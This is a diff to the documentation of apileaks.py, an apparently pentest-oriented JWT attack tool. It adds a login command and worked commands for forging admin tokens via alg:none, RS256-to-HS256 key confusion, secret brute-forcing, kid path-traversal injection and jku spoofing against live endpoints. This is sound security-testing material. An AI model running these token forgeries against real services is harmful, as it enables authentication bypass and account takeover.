@@ -118,7 +118,17 @@ Generates and prints the token with the algorithm rewritten to `none` and the si
 python apileaks.py jwt test-alg-none TOKEN
 ```
 
----
+**7. Fetch a token from a login endpoint (`jwt login`)**
+
+POSTs credentials to an authentication endpoint, captures the returned JWT, and optionally saves it
+to a file. Auto-detects the token field name (`token`, `access_token`, `jwt`, `id_token`, etc.) or
+accepts a custom field name via `--token-field`. Decodes and summarizes the captured token inline.
+
+```bash
+python apileaks.py jwt login \
+    --url http://HOST/api/v1.0/login \
+    --body '{"username":"user","password":"password1"}'
+```
 
 ### Intermediate uses
 
@@ -354,8 +364,8 @@ python apileaks.py scan \
 
 ## Subcommands
 
-The `jwt` group has exactly **13** subcommands: five utilities (`decode`, `encode`, `verify`,
-`genkey`, `jwks-to-key`) and eight attack commands (`test-alg-none`, `test-null-signature`,
+The `jwt` group has exactly **14** subcommands: five utilities (`decode`, `encode`, `verify`,
+`genkey`, `jwks-to-key`) and nine attack commands (`login`, `test-alg-none`, `test-null-signature`,
 `test-alg-confusion`, `brute-secret`, `test-kid-injection`, `test-jwks-spoof`, `test-inline-jwks`,
 `attack-test`).
 
@@ -395,14 +405,46 @@ base tokens to feed into the attack subcommands, or for manual testing.
 **Syntax:**
 
 ```bash
-python apileaks.py jwt encode PAYLOAD [--header HEADER_JSON] [--secret SECRET]
+python apileaks.py jwt encode PAYLOAD [--header HEADER_JSON] [--secret SECRET] [--public-key PATH]
 ```
 
 **Arguments/options:**
 
 - `PAYLOAD` (positional, required) — JWT payload as a JSON string.
 - `--header` — JWT header as a JSON string (default: `{"alg":"HS256","typ":"JWT"}`).
-- `--secret` — secret key used for signing (default: `secret`).
+- `--secret` — secret key used for HMAC signing (default: `secret`). Ignored when `--public-key` is supplied or when `alg` is `none`.
+- `--public-key` — path to a PEM public key file used as the HMAC secret bytes (RS256→HS256 key confusion attack). When supplied, `--secret` is ignored and the raw DER bytes of the key are used as the HMAC key — exactly as vulnerable libraries do.
+
+**`alg:none` behavior:**
+
+When the header `alg` is `none`, `None`, or `NONE`, `jwt encode` automatically skips signature
+generation and produces a token ending in a trailing dot (`header.payload.`) with no signature
+segment. The `--secret` option is silently ignored. This is the correct format for the
+[RFC 7519 §6](https://tools.ietf.org/html/rfc7519#section-6) unsecured JWT.
+
+```bash
+# alg:none — produces header.payload. (no signature)
+python apileaks.py jwt encode '{"username":"user","admin":1}' \
+    --header '{"alg":"none","typ":"JWT"}'
+# Same result with any casing: "None", "NONE"
+```
+
+**Key confusion attack with `--public-key`:**
+
+When `--public-key` is given, the token is signed using the **raw DER bytes** of the public key as
+the HMAC secret. This is the byte-exact form that vulnerable RS256 libraries use internally during
+verification — so the forged HS256 token passes their signature check. This is equivalent to what
+`test-alg-confusion` does under the hood, but gives you direct control over the payload.
+
+```bash
+# First convert the server's ssh-rsa key to PKCS#8 PEM
+ssh-keygen -f /dev/stdin -i -m PKCS8 <<< "ssh-rsa AAAA..." > public_pkcs8.pem
+
+# Forge admin token signed with the public key's DER bytes
+python apileaks.py jwt encode '{"username":"user","admin":1}' \
+    --header '{"alg":"HS256","typ":"JWT"}' \
+    --public-key public_pkcs8.pem
+```
 
 **Examples:**
 
@@ -415,8 +457,17 @@ python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
 
 # Custom header and secret
 python apileaks.py jwt encode '{"sub":"admin","role":"admin"}' \
-  --header '{"alg":"HS256","typ":"JWT","kid":"1"}' \
-  --secret mysecret
+    --header '{"alg":"HS256","typ":"JWT","kid":"1"}' \
+    --secret mysecret
+
+# alg:none — trailing dot, no signature (all three casings work)
+python apileaks.py jwt encode '{"username":"user","admin":1}' \
+    --header '{"alg":"none","typ":"JWT"}'
+
+# Key confusion — sign with DER bytes of the server's public key
+python apileaks.py jwt encode '{"username":"user","admin":1}' \
+    --header '{"alg":"HS256","typ":"JWT"}' \
+    --public-key public_pkcs8.pem
 ```
 
 ---
@@ -522,7 +573,85 @@ Unparseable input or a JWK missing required parameters is rejected with a descri
 
 ---
 
-### 6. `jwt test-alg-none` — algorithm confusion (alg:none) *(Signature Stripping Attack)*
+### 6. `jwt login` — fetch a token from a login endpoint
+
+**Purpose:** POST credentials to an authentication endpoint, capture the returned JWT, print it to
+stdout, decode it inline, and optionally save it to a file. This replaces a manual `curl` login
+step so the captured token can flow directly into other `jwt` subcommands.
+
+The command auto-detects the JWT field in the JSON response, checking common names in order:
+`token`, `access_token`, `jwt`, `id_token`, `accessToken`, `auth_token`, `bearer`. Use
+`--token-field` to specify the exact field name when auto-detection fails.
+
+**Syntax:**
+
+```bash
+python apileaks.py jwt login -u URL [-d BODY] [-X METHOD] [-H "Name: Value"]... \
+    [--token-field FIELD] [--save PATH] [--no-ssl-verify] [--timeout SECONDS]
+```
+
+**Arguments/options:**
+
+- `-u`, `--url` (required) — login endpoint URL.
+- `-d`, `--body` — JSON body with credentials (default: `{}`).
+- `-X`, `--method` — HTTP method: `POST`, `GET`, or `PUT` (default: `POST`).
+- `-H`, `--header` — extra headers in `"Name: Value"` format. Repeatable.
+- `--token-field` — exact JSON field name containing the token. Auto-detected if omitted.
+- `--save` — file path to save the captured token (e.g. `token.jwt`). Optional.
+- `--no-ssl-verify` — disable TLS certificate verification.
+- `--timeout` — request timeout in seconds (default: `30`).
+
+**Examples:**
+
+```bash
+# Login and print token to terminal
+python apileaks.py jwt login \
+    --url http://10.10.10.10/api/v1.0/example1 \
+    --body '{"username":"user","password":"password1"}'
+
+# Login, save token, then decode it
+python apileaks.py jwt login \
+    --url http://HOST/api/v1.0/login \
+    --body '{"username":"user","password":"password1"}' \
+    --save token.jwt
+
+python apileaks.py jwt decode $(cat token.jwt)
+
+# Custom token field name (when auto-detection is insufficient)
+python apileaks.py jwt login \
+    --url http://HOST/auth \
+    --body '{"user":"admin","pass":"secret"}' \
+    --token-field auth_token \
+    --save token.jwt
+
+# Use the saved token immediately in an attack
+python apileaks.py jwt login \
+    --url http://HOST/api/v1.0/example3 \
+    --body '{"username":"user","password":"password3"}' \
+    --save token.jwt
+
+python apileaks.py jwt encode \
+    '{"username":"user","admin":1}' \
+    --header '{"alg":"none","typ":"JWT"}'
+
+# Chain login → brute-secret → attack-test
+python apileaks.py jwt login \
+    --url http://HOST/api/v1.0/example4 \
+    --body '{"username":"user","password":"password4"}' \
+    --save token.jwt
+
+python apileaks.py jwt brute-secret $(cat token.jwt) \
+    --wordlist jwt.secrets.list
+```
+
+> **ssh-rsa response:** Some endpoints return `"public_key": "ssh-rsa AAAA..."` alongside the
+> token. The `login` command only captures the token field. Convert the ssh-rsa key to PKCS#8 PEM
+> with `ssh-keygen -f /dev/stdin -i -m PKCS8 <<< "ssh-rsa AAAA..." > public.pem` before using it
+> with `--public-key` or `test-alg-confusion`.
+
+---
+
+### 7. `jwt test-alg-none` — algorithm confusion (alg:none) *(Signature Stripping Attack)*
 
 **Purpose:** Test the classic algorithm-confusion / **signature stripping** attack by rewriting the
 header algorithm to `none` and removing the signature entirely, then (if a payload is supplied)
@@ -559,7 +688,7 @@ python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
 
 ---
 
-### 7. `jwt test-null-signature` — null signature bypass *(Signature Stripping Attack)*
+### 8. `jwt test-null-signature` — null signature bypass *(Signature Stripping Attack)*
 
 **Purpose:** Test acceptance of empty/null signatures (e.g. `header.payload.`) — a variant of the
 **signature stripping** attack where the signature segment is emptied or nulled while the header
@@ -595,7 +724,7 @@ python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/p
 
 ---
 
-### 8. `jwt test-alg-confusion` — RS256/ES256 → HS256 key confusion *(Substitution Attack)*
+### 9. `jwt test-alg-confusion` — RS256/ES256 → HS256 key confusion *(Substitution Attack)*
 
 **Purpose:** Test the algorithm/key-confusion attack, also known as the **Substitution Attack**. It
 forges a token that a server validates with the **same asymmetric public key** it uses for
@@ -656,7 +785,7 @@ python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
 
 ---
 
-### 9. `jwt brute-secret` — brute-force weak HMAC secrets *(Bruteforcing HS256 Secret Key)*
+### 10. `jwt brute-secret` — brute-force weak HMAC secrets *(Bruteforcing HS256 Secret Key)*
 
 **Purpose:** **Brute-force an `HS256` (or other `HS*`) signing secret** by trying candidates from a
 wordlist and verifying each against the token's real signature. On success, it forges
@@ -701,7 +830,7 @@ If the secret is not in the wordlist, the command reports that and stops — no 
 
 ---
 
-### 10. `jwt test-kid-injection` — Key ID (kid) injection
+### 11. `jwt test-kid-injection` — Key ID (kid) injection
 
 **Purpose:** Test Key ID (`kid`) header injection. The engine owns a curated set of `kid` payloads
 (path traversal, remote URLs, injection strings); `--kid-payload` overrides the primary value and
@@ -747,7 +876,7 @@ Common `--kid-payload` ideas: path traversal (`../../etc/passwd`), remote URLs
 
 ---
 
-### 11. `jwt test-jwks-spoof` — JWKS URL (jku) spoofing
+### 12. `jwt test-jwks-spoof` — JWKS URL (jku) spoofing
 
 **Purpose:** Test whether the server trusts an attacker-controlled JWKS/`jku` URL. The engine signs
 with the resolved attacker key and points the token at the spoofed URL.
@@ -786,7 +915,7 @@ python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/prote
 
 ---
 
-### 12. `jwt test-inline-jwks` — inline JWKS injection
+### 13. `jwt test-inline-jwks` — inline JWKS injection
 
 **Purpose:** Test whether the server trusts a public key embedded directly in the token header
 (inline `jwk`). The engine generates its own keypair, embeds the public key inline, and signs with
@@ -821,7 +950,7 @@ python apileaks.py jwt test-inline-jwks TOKEN -u https://api.example.com/admin -
 
 ---
 
-### 13. `jwt attack-test` — comprehensive automated suite
+### 14. `jwt attack-test` — comprehensive automated suite
 
 **Purpose:** Run APILeak's full JWT attack suite against a live endpoint and produce a vulnerability
 assessment with baseline comparison and confidence scoring. It exercises algorithm confusion,
@@ -884,10 +1013,27 @@ python apileaks.py jwt attack-test -u https://api.example.com/protected \
 
 A typical hands-on assessment with the `jwt` group:
 
+0. **Get a token from the login endpoint.**
+
+   ```bash
+   python apileaks.py jwt login \
+       --url http://TARGET/api/v1.0/login \
+       --body '{"username":"user","password":"password1"}' \
+       --save token.jwt
+   ```
+
+   The command auto-detects the token field, prints the raw token, decodes it inline (showing `alg`,
+   `sub`, `exp`), and saves it to `token.jwt` for the next steps. If the response also includes a
+   `public_key` field (ssh-rsa format), convert it first:
+
+   ```bash
+   ssh-keygen -f /dev/stdin -i -m PKCS8 <<< "ssh-rsa AAAA..." > public_pkcs8.pem
+   ```
+
 1. **Decode and understand the token.**
 
    ```bash
-   python apileaks.py jwt decode "$TOKEN"
+   python apileaks.py jwt decode $(cat token.jwt)
    ```
 
    Note the algorithm (`HS*` vs `RS*`/`ES*`), the claims you might escalate (`role`, `sub`,
@@ -897,7 +1043,7 @@ A typical hands-on assessment with the `jwt` group:
    `verify` (and `genkey` / `jwks-to-key` to prepare keys):
 
    ```bash
-   python apileaks.py jwt verify "$TOKEN" --secret secret
+   python apileaks.py jwt verify $(cat token.jwt) --secret secret
    python apileaks.py jwt genkey --type rsa --bits 2048
    python apileaks.py jwt jwks-to-key --jwks jwks.json
    ```
@@ -905,27 +1051,49 @@ A typical hands-on assessment with the `jwt` group:
 3. **Generate attack tokens offline** (no `--url`) to inspect exactly what will be sent:
 
    ```bash
-   python apileaks.py jwt test-alg-none "$TOKEN"
-   python apileaks.py jwt test-null-signature "$TOKEN"
-   python apileaks.py jwt test-alg-confusion "$TOKEN" --public-key server_pub.pem
-   python apileaks.py jwt brute-secret "$TOKEN" -w wordlists/jwt_secrets.txt
-   python apileaks.py jwt test-kid-injection "$TOKEN"
-   python apileaks.py jwt test-jwks-spoof "$TOKEN"
-   python apileaks.py jwt test-inline-jwks "$TOKEN"
+   python apileaks.py jwt test-alg-none $(cat token.jwt)
+   python apileaks.py jwt test-null-signature $(cat token.jwt)
+   python apileaks.py jwt test-alg-confusion $(cat token.jwt) --public-key server_pub.pem
+   python apileaks.py jwt brute-secret $(cat token.jwt) -w jwt.secrets.list
+   python apileaks.py jwt test-kid-injection $(cat token.jwt)
+   python apileaks.py jwt test-jwks-spoof $(cat token.jwt)
+   python apileaks.py jwt test-inline-jwks $(cat token.jwt)
    ```
 
-4. **Fire individual attacks at a live endpoint** by adding `--url` (plus headers/data as needed):
+4. **Forge a specific token manually** (`jwt encode`):
 
    ```bash
-   python apileaks.py jwt test-alg-none "$TOKEN" --url "$TARGET"
-   python apileaks.py jwt brute-secret "$TOKEN" --url "$TARGET" -H "X-API-Key: key123"
+   # alg:none — no signature (trailing dot)
+   python apileaks.py jwt encode '{"username":"user","admin":1}' \
+       --header '{"alg":"none","typ":"JWT"}'
+
+   # Key confusion — DER bytes of public key as HMAC secret
+   python apileaks.py jwt encode '{"username":"user","admin":1}' \
+       --header '{"alg":"HS256","typ":"JWT"}' \
+       --public-key public_pkcs8.pem
+
+   # Known weak secret
+   python apileaks.py jwt encode '{"username":"user","admin":1}' \
+       --header '{"alg":"HS256","typ":"JWT"}' \
+       --secret "found_secret"
    ```
 
-5. **Run the comprehensive suite** with `attack-test` to cover every vector at once and get a
+5. **Fire individual attacks at a live endpoint** by adding `--url` (plus headers/data as needed):
+
+   ```bash
+   python apileaks.py jwt test-alg-none $(cat token.jwt) --url "$TARGET"
+   python apileaks.py jwt brute-secret $(cat token.jwt) --url "$TARGET" -H "X-API-Key: key123"
+   python apileaks.py jwt test-alg-confusion $(cat token.jwt) \
+       --public-key public_pkcs8.pem \
+       --payload '{"admin":1}' \
+       --url "$TARGET?username=admin"
+   ```
+
+6. **Run the comprehensive suite** with `attack-test` to cover every vector at once and get a
    scored assessment:
 
    ```bash
-   python apileaks.py jwt attack-test "$TOKEN" --url "$TARGET"
+   python apileaks.py jwt attack-test $(cat token.jwt) --url "$TARGET"
    ```
 
 For an automated JWT check as part of a broader scan (rather than these manual steps), run the auth
